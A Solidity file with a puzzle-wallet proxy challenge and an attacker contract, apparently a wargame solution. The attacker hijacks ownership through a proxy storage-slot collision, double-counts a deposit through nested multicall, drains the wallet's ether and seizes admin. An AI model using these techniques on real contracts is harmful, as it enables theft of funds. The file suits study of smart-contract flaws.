// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {UpgradeableProxy} from "./UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;    //we can modify this
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {    // modify pendingAdmin
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin { // only admin can call this
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");    // slot admin must be 0
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

// puzzle wallet address : 0x78b24729552D2D54b0623F1162d30DA03bdFc6c1
contract Hack {
    address payable target = payable(0x8B611331683Fec3C0E32eE47859C049D0c887064);
    bytes[] call1 = new bytes[](1);
    bytes[] call2 = new bytes[](2);
    PuzzleProxy pp = PuzzleProxy(target);
    PuzzleWallet pw = PuzzleWallet(target);

    function setMulticall() public {

        // 构造 call1：deposit()
        call1[0] = abi.encodeWithSelector(pw.deposit.selector);

        // 构造 call2：doSomething(123)
        call2[0] = abi.encodeWithSelector(pw.deposit.selector);
        call2[1] = abi.encodeWithSelector(pw.multicall.selector, call1);

    }

    function attack() public payable {
        pp.proposeNewAdmin(address(this));    // set slot0 to our address
        pw.addToWhitelist(address(this));
        setMulticall();
        pw.multicall{value: 0.001 ether}(call2);
        pw.execute(address(this), 0.002 ether, "");
        pw.setMaxBalance(uint256(uint160(tx.origin)));
    }

    function reFund() public payable {
        address myWallet = 0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65;
        (bool success, ) = myWallet.call{value: address(this).balance}("");
        require(success, "reFund failed");
    }

    receive() external payable {}

}